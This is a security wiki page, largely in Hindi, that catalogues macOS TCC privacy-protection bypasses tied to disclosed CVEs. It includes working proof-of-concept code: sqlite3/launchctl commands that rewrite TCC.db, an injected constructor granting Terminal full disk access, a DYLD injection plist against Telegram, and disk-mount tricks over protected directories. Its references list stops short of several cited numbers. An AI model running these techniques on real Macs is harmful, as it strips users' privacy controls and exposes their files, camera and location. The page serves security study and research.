# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## functionality के अनुसार

### Write Bypass

यह कोई bypass नहीं है, यह सिर्फ TCC के काम करने का तरीका है: **यह writing से सुरक्षा नहीं देता**। यदि Terminal के पास किसी user के Desktop को read करने की **access** नहीं है, तब भी वह उसमें **write** कर सकता है:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** नई **file** में जोड़ा जाता है, ताकि **creators app** को उसे पढ़ने की access मिल सके।

### TCC ClickJacking

**TCC prompt के ऊपर एक window रखना** संभव है, ताकि user **बिना ध्यान दिए** इसे **accept** कर ले। आप इसका PoC [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में पा सकते हैं।**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker **किसी भी नाम** (जैसे Finder, Google Chrome...) वाली **apps बना** सकता है, उस नाम को **`Info.plist`** में डाल सकता है और उनसे किसी TCC protected location की access request करवा सकता है। User सोचेगा कि legit application यह access request कर रही है।\
इसके अलावा, **legit app को Dock से हटाकर उसकी जगह fake app रखना** संभव है। इसलिए जब user fake app पर click करता है (जो उसी icon का उपयोग कर सकती है), तो यह legit app को call कर सकती है, TCC permissions मांग सकती है और malware execute कर सकती है, जिससे user को लगेगा कि legit app ने access request की है।

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहाँ:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By default, **SSH के माध्यम से access में "Full Disk Access"** होता था। इसे disable करने के लिए इसे list में रखना लेकिन disabled करना आवश्यक है (इसे list से हटाने पर वे privileges समाप्त नहीं होंगे):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

यहाँ आपको कुछ examples मिलेंगे कि कुछ **malwares इस protection को bypass करने में कैसे सक्षम रहे हैं**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि अब SSH को enable करने के लिए **Full Disk Access** आवश्यक है।

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** files को दिया जाता है, ताकि **एक निश्चित application को उसे पढ़ने की permissions मिल सकें।** यह attribute तब set होता है जब किसी file को किसी app पर **drag\&drop** किया जाता है, या जब user किसी file को **default application** से open करने के लिए **double-click** करता है।

इसलिए, user सभी extensions को handle करने के लिए **एक malicious app register** कर सकता है और किसी भी file को **open** करने के लिए Launch Services को call कर सकता है (इससे malicious file को उसे पढ़ने की access मिल जाएगी)।

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** के माध्यम से **`com.apple.iCloudHelper`** XPC service से communicate करना संभव है, जो **iCloud tokens प्रदान करेगी**।

**iMovie** और **Garageband** के पास यह entitlement और अन्य अनुमतियाँ थीं, जो इसकी अनुमति देती थीं।

Entitlement से **icloud tokens प्राप्त करने** वाले exploit के बारे में अधिक **information** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission वाली app अन्य **Apps को control** कर सकेगी। इसका अर्थ है कि वह अन्य Apps को दी गई **permissions का abuse** कर सकती है।

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, यदि किसी App के पास **`iTerm` पर Automation permission** है, तो इस example में **`Terminal`** के पास iTerm पर access है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास यह access है, और इसका उपयोग actions perform करने के लिए कर सकता है:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder के माध्यम से

या यदि किसी App के पास Finder के माध्यम से access है, तो वह इस जैसी script चला सकता है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App behaviour के अनुसार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon** **`HOME`** **env** variable का उपयोग TCC users database को इस स्थान से access करने के लिए करता था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon वर्तमान user के domain के भीतर **`launchd`** के माध्यम से चल रहा है, इसलिए उसे दिए जाने वाले **सभी environment variables को control करना** संभव है।\
इस प्रकार, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **controlled** **directory** की ओर point कर सकता था, **TCC** daemon को **restart** कर सकता था, और फिर **TCC database को सीधे modify** करके बिना end user को कभी prompt किए स्वयं को उपलब्ध **हर TCC entitlement** दे सकता था।<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes को TCC protected locations तक access प्राप्त था, लेकिन जब कोई note बनाया जाता है, तो यह **non-protected location में बनाया जाता है**। इसलिए, आप Notes से किसी protected file को किसी note में copy करने के लिए कह सकते थे (अर्थात non-protected location में) और फिर उस file तक access कर सकते थे:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Library `libsecurity_translocate` वाली binary `/usr/libexec/lsd` के पास entitlement `com.apple.private.nullfs_allow` था, जो इसे **nullfs** mount बनाने की अनुमति देता था। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ entitlement `com.apple.private.tcc.allow` भी था, जिससे यह हर file तक access कर सकती थी।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को call करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर मौजूद सभी documents को **access** किया जा सकता था।

### CVE-2024-44131 - FileProvider symlink race

जो Apps file operations को **privileged helper** (यहाँ **`fileproviderd`** / **`Files.app`**) को सौंपती हैं, वे user की ओर से items को copy या move करती हैं। इसलिए copy caller के बजाय helper के privileges के साथ चलती है।

Jamf Threat Labs ने दिखाया कि operation से पहले की जाने वाली symlink validation को **race** किया जा सकता है: **last** path component (जिसे check किया जाता है) पर symlink लगाने के बजाय, attacker copy शुरू होने के **बाद** path की किसी **intermediate** directory को बदल देता है। इसके बाद privileged helper attacker-controlled link को follow करता है और बिना कोई prompt दिखाए TCC-protected locations को read/write करता है।<sup>[[7]](#references)</sup>

वे directories जिनके path में random UUID से **protection** नहीं होती (उदाहरण के लिए `~/Library/Mobile Documents/com~apple~CloudDocs`), सबसे आसान targets हैं, क्योंकि attacker race करने के लिए पूरा path पहले से predict कर सकता है।

> [!TIP]
> यह देखने योग्य generic pattern है: **कोई भी privileged process जो किसी path को एक से अधिक बार resolve करता है** (check-then-use, या `rename()`/`copyfile()` द्वारा source और destination को अलग-अलग resolve करना), path के बीच में किसी directory को बदलकर race किया जा सकता है। केवल `O_NOFOLLOW_ANY`, पहले से खुले directory FD पर `openat()`, या `realpath()` + re-validation ही वास्तव में इस window को बंद करते हैं।

अधिक जानकारी [**Jamf Threat Labs की writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) में है।<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` को `SQLITE_ENABLE_SQLLOG` के साथ build किया जा सकता है, जिससे environment variables द्वारा संचालित logging hook जुड़ जाता है ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **हर खोली जाने वाली database** के लिए, **database file की एक copy** और SQL statements का log `path` में लिखा जाता है (directory पहले से मौजूद होनी चाहिए)।
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB के open/attach होने पर किसी मौजूदा copy को reuse करने के बजाय **हर बार नई copy** बनाई जाती है।
- **`SQLITE_SQLLOG_CONDITIONAL`** – connection को तभी log किया जाता है जब main DB के पास `<database>-sqllog` file मौजूद हो।

यदि आप इस variable को ऐसे process में inject कर सकते हैं जिसके पास **FDA** हो और जो SQLite databases खोलता हो, तो वह खुशी-खुशी **उन protected databases को आपके नियंत्रण वाली directory में copy** कर देगा। क्योंकि destination filename attacker-controlled data से प्राप्त होता है, destination पर लगाया गया **symlink** इसी primitive को target process के privileges के साथ **arbitrary file write** में बदल देता है।

### **SQLITE_AUTO_TRACE**

यदि environment variable **`SQLITE_AUTO_TRACE`** set किया गया हो, तो library **`libsqlite3.dylib`** सभी SQL queries की **logging** शुरू कर देगी। कई applications इस library का उपयोग करती थीं, इसलिए उनकी सभी SQLite queries को log करना संभव था।

कई Apple applications TCC protected information तक access करने के लिए इस library का उपयोग करती थीं।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes की तलाश

पिछली दो entries एक ही generic technique के उदाहरण हैं, और ऐसी अन्य जगहों को खोजना उपयोगी है: **TCC-privileged apps में loaded frameworks अक्सर debug/logging environment variables expose करते हैं, जो process को caller-controlled path पर file create करने के लिए मजबूर करते हैं**।

उन्हें खोजने का workflow:

1. FDA या किसी अन्य उपयोगी TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) वाले target को चुनें और उसके द्वारा linked frameworks की सूची बनाएं (`otool -L`, `vmmap`)।
2. उन frameworks में `getenv` strings के लिए grep करें: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Candidate variables को `launchctl setenv NAME /path/you/control` के माध्यम से set करें, app launch करें और `fs_usage -w -f filesys <pid>` या `sudo fs_usage | grep <path>` से filesystem पर उसकी गतिविधि देखें।
4. यदि process आपकी directory में कोई file **create या rename** करता है, तो आपके पास एक write primitive है: destination को किसी symlink पर point करें (या किसी intermediate directory पर race करें, जैसा ऊपर CVE-2024-44131 में है) ताकि उसे `~/Library/Application Support/com.apple.TCC/TCC.db` पर redirect किया जा सके।

> [!TIP]
> इसे दो बातें सीमित करती हैं। पहली, **hardened-runtime binaries के लिए `DYLD_*` variables को ignore किया जाता है**, जब तक कि app में [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") मौजूद न हो — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) भी देखें। दूसरी, report किए जाने पर Apple अलग-अलग framework debug variables को हटा देता है, इसलिए एक macOS release पर काम करने वाला variable अक्सर अगले release में मौजूद नहीं रहता। यदि किसी variable को set करने के बाद app चुपचाप launch होने से मना कर दे, तो उस variable को पहले से filtered मानें।

Linker variables के साथ इसी तरह की trick के लिए [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) देखें।

### Apple Remote Desktop

Root के रूप में आप इस service को enable कर सकते हैं और **ARD agent के पास full disk access होगा**, जिसका दुरुपयोग करके कोई user नया **TCC user database** copy करवा सकता है।

## **NFSHomeDirectory** द्वारा

TCC user के लिए specific resources तक access नियंत्रित करने के लिए user के HOME folder में database का उपयोग करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि user TCC को ऐसे $HOME env variable के साथ restart करने में सफल हो जाता है जो **अलग folder** की ओर point करता है, तो वह **/Library/Application Support/com.apple.TCC/TCC.db** में नया TCC database बना सकता है और TCC को किसी भी app को कोई भी TCC permission grant करने के लिए trick कर सकता है।

> [!TIP]
> ध्यान दें कि Apple **`NFSHomeDirectory`** attribute में user के profile के भीतर stored setting का उपयोग **`$HOME` के value** के रूप में करता है। इसलिए, यदि आप किसी ऐसी application को compromise करते हैं जिसके पास इस value को modify करने की permission (**`kTCCServiceSystemPolicySysAdminFiles`**) है, तो आप इस option को TCC bypass के साथ **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** user के **HOME** folder को modify करने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है।

1. Target app के लिए _csreq_ blob प्राप्त करें।
2. Required access और _csreq_ blob वाली fake _TCC.db_ file plant करें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) से user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry को modify करें।
5. Modified Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) से import करें।
6. User के _tccd_ को stop करें और process को reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` में `kTCCServiceSystemPolicySysAdminFiles` value थी।\
`configd` को **`-t`** option के साथ run करना संभव था, और attacker एक **custom Bundle to load** specify कर सकता था। इसलिए exploit में user की home directory बदलने के लिए **`dsexport`** और **`dsimport`** method को **`configd` code injection** से replace किया गया।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।<sup>[[13]](#references)</sup>

## process injection द्वारा

किसी process के अंदर code inject करने और उसके TCC privileges का दुरुपयोग करने की अलग-अलग techniques हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass करने के लिए पाया जाने वाला सबसे common process injection **plugins (load library)** के माध्यम से होता है।\
Plugins extra code होते हैं, आमतौर पर libraries या plist के रूप में, जिन्हें **main application द्वारा loaded** किया जाता है और जो उसके context में execute होते हैं। इसलिए, यदि main application को TCC-restricted files तक access प्राप्त था (granted permissions या entitlements के माध्यम से), तो **custom code के पास भी वह access होगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करता था और इसमें **hardened** runtime नहीं था।

इस CVE को weaponize करने के लिए, **`NFSHomeDirectory`** को बदला जाता है (पिछले entitlement का दुरुपयोग करके), ताकि users के TCC databas**e** पर **take over** किया जा सके और TCC bypass किया जा सके।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था** और दूसरा उसे **TCC manage करने का access देता था**।

इस binary को `/Library/Audio/Plug-Ins/HAL` folder से **third party plug-ins** load करने की अनुमति थी। इसलिए इस PoC के साथ **एक plugin load करना और TCC permissions का दुरुपयोग करना** संभव था:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

वे System applications जो Core Media I/O के माध्यम से camera stream खोलते हैं (वे apps जिनमें **`kTCCServiceCamera`** है), प्रक्रिया में `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित इन plugins को load करते हैं (यह SIP restricted नहीं है)।

वहां common **constructor** वाली library को केवल store करना **inject code** के लिए पर्याप्त होगा।

कई Apple applications इसके प्रति vulnerable थीं।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
इसका आसानी से exploit करने के तरीके की अधिक जानकारी के लिए [**original report देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)।<sup>[[16]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` में entitlements **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** थे, जिससे process के अंदर code inject करना और TCC privileges का उपयोग करना संभव था।

### CVE-2023-26818 - Telegram

Telegram में entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** थे, इसलिए इसका दुरुपयोग करके इसकी permissions तक **access प्राप्त करना** संभव था, जैसे camera से recording करना। आप [**writeup में payload देख सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।<sup>[[17]](#references)</sup>

ध्यान दें कि env variable का उपयोग करके library load करने के लिए एक **custom plist** बनाया गया था, ताकि यह library inject की जा सके, और इसे launch करने के लिए **`launchctl`** का उपयोग किया गया था:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations द्वारा

**`open`** को sandboxed होने पर भी invoke करना संभव है।

### Terminal Scripts

तकनीकी लोगों द्वारा उपयोग किए जाने वाले computers में Terminal को **Full Disk Access (FDA)** देना काफी सामान्य है। और इसके साथ **`.terminal`** scripts को invoke करना संभव है।

**`.terminal`** scripts plist files होती हैं, जैसे यह file, जिसमें execute करने वाली command **`CommandString`** key में होती है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक application /tmp जैसी location में terminal script लिख सकता है और उसे इस तरह के command से launch कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**कोई भी user** (यहां तक कि unprivileged users भी) एक time machine snapshot बना और mount कर सकता है और उस snapshot की **सभी files तक access** प्राप्त कर सकता है।\
आवश्यक **एकमात्र privilege** यह है कि उपयोग किए गए application (जैसे `Terminal`) को **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) प्राप्त हो, जिसे किसी admin द्वारा grant किया जाना आवश्यक है।<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
एक अधिक विस्तृत विवरण [**मूल रिपोर्ट में पाया जा सकता है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**

### CVE-2021-1784 और CVE-2021-30808 - TCC file पर Mount

भले ही TCC DB file सुरक्षित हो, फिर भी **directory पर mount करके** एक नई TCC.db file लगाना संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में **full exploit** देखें।

### CVE-2024-40855

जैसा कि [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में बताया गया है, इस CVE ने `diskarbitrationd` का दुरुपयोग किया था।<sup>[[18]](#references)</sup>

Public `DiskArbitration` framework का `DADiskMountWithArgumentsCommon` function security checks करता था। हालांकि, `diskarbitrationd` को सीधे call करके इसे bypass करना संभव था और इसलिए path में `../` elements और symlinks का उपयोग किया जा सकता था।

इससे attacker किसी भी location पर arbitrary mounts कर सकता था, जिसमें TCC database के ऊपर mount करना भी शामिल था, क्योंकि `diskarbitrationd` के पास `com.apple.private.security.storage-exempt.heritable` entitlement था।

### asr

Tool **`/usr/sbin/asr`** पूरे disk को copy करके किसी अन्य स्थान पर mount कर सकता था और TCC protections को bypass कर सकता था।

### CVE-2022-22655 - Location Services

Location Services को अन्य services की तरह TCC database में store **नहीं** किया जाता। इन्हें `locationd` manage करता है, जो अपनी allow-list **`/var/db/locationd/clients.plist`** में रखता है:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Each entry client (bundle ID या executable path) के आधार पर keyed होता है और इसमें `Authorized`, `BundleId`, `Executable` तथा `Registered` जैसे fields होते हैं।

`clients.plist` file स्वयं Sandbox/TCC द्वारा protected है और इसे root के रूप में भी edit नहीं किया जा सकता — लेकिन **`/var/db/locationd/` directory mounting से protected नहीं थी**। इसलिए root के रूप में चल रहा attacker अपनी `clients.plist` वाली disk image बना सकता था (जिसमें उसका binary `Authorized` के रूप में marked हो), उसे directory के ऊपर mount कर सकता था और forged allow-list को प्रभावी बनाने के लिए `locationd` को restart कर सकता था।<sup>[[5]](#references)</sup>

> [!TIP]
> यह ऊपर बताए गए `hdiutil`/`mount` TCC bypasses जैसा ही pattern है: *file* protected है, लेकिन जिस *directory* में वह मौजूद है वह protected नहीं है, इसलिए file के बजाय पूरी directory को replace किया जाता है।

## Startup apps के माध्यम से


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep के माध्यम से

कई अवसरों पर files sensitive information जैसे emails, phone numbers, messages... को non protected locations में store करती हैं (जो Apple के अनुसार vulnerability मानी जाती हैं)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

यह अब काम नहीं करता, लेकिन [**अतीत में काम करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करने का एक अन्य तरीका:<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework को bypass करना](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Accident और Design द्वारा macOS TCC User Privacy Protections को bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [आपके macOS Privacy Mechanisms को bypass करने के 20+ तरीके](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [TCC के विरुद्ध Knockout Win - आपके MacOS Privacy Mechanisms को bypass करने के 20+ नए तरीके](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [दुनिया में Carmen Sandiego कहाँ है: macOS पर Location Services का दुरुपयोग](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass द्वारा iCloud से data चोरी](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [XCSSET malware में Zero-Day TCC bypass discovered](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
